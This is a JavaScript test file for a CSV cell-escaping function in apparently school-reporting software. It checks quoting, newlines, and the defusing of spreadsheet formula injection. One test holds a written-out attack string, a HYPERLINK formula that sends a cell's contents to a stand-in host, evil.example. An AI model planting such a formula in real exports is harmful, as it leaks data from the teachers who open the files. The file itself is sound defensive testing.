import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { csvCell } from '../../src/lib/csv.js';

/**
 * Every report downloads as CSV, and every CSV is opened in Excel.
 *
 * A cell beginning =, +, - or @ is a formula to a spreadsheet, so a child whose
 * first name is a formula becomes code running on a teacher's laptop when they
 * open the class list. This was a real hole here, found by putting
 * =HYPERLINK(...) in a student's name and downloading the report.
 */

describe('escaping a cell for a spreadsheet', () => {
  test('ordinary text passes through unchanged', () => {
    assert.equal(csvCell('Meera Iyer'), 'Meera Iyer');
    assert.equal(csvCell('Grade 8'), 'Grade 8');
  });

  test('a comma forces quoting', () => {
    assert.equal(csvCell('Iyer, Meera'), '"Iyer, Meera"');
  });

  test('a quote is doubled inside quotes', () => {
    assert.equal(csvCell('She said "hello"'), '"She said ""hello"""');
  });

  test('newlines are kept but quoted, so a row stays a row', () => {
    assert.equal(csvCell('line one\nline two'), '"line one\nline two"');
    assert.equal(csvCell('line one\r\nline two'), '"line one\r\nline two"');
  });

  test('null and undefined become empty, not "null"', () => {
    assert.equal(csvCell(null), '');
    assert.equal(csvCell(undefined), '');
  });
});

describe('a cell a spreadsheet would treat as a formula', () => {
  // The four leading characters Excel and LibreOffice both act on, plus the
  // whitespace forms that slip past a naive check.
  for (const dangerous of ['=1+1', '+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1']) {
    test(`${JSON.stringify(dangerous)} is defused with a leading apostrophe`, () => {
      const out = csvCell(dangerous);
      assert.ok(out.startsWith("'") || out.startsWith(`"'`), `got ${out}`);
    });
  }

  test('the real attack from the security pass is defused', () => {
    const attack = '=HYPERLINK("http://evil.example/?x="&A1,"Click me")';
    const out = csvCell(attack);
    assert.ok(out.startsWith(`"'=HYPERLINK`) || out.startsWith(`'=HYPERLINK`), `got ${out}`);
  });

  test('a plain negative number is left alone, because it is data', () => {
    // Negative marking produces these constantly. Quoting them as text would
    // make every marks column unusable for arithmetic.
    assert.equal(csvCell(-1), '-1');
    assert.equal(csvCell('-1'), '-1');
    assert.equal(csvCell(-0.25), '-0.25');
    assert.equal(csvCell('-12.5'), '-12.5');
  });

  test('but something that only starts like a number is not', () => {
    assert.equal(csvCell('-1+1'), `'-1+1`);
    assert.equal(csvCell('-1e9-1'), `'-1e9-1`);
  });

  test('numbers generally are untouched', () => {
    assert.equal(csvCell(0), '0');
    assert.equal(csvCell(97.5), '97.5');
  });
});
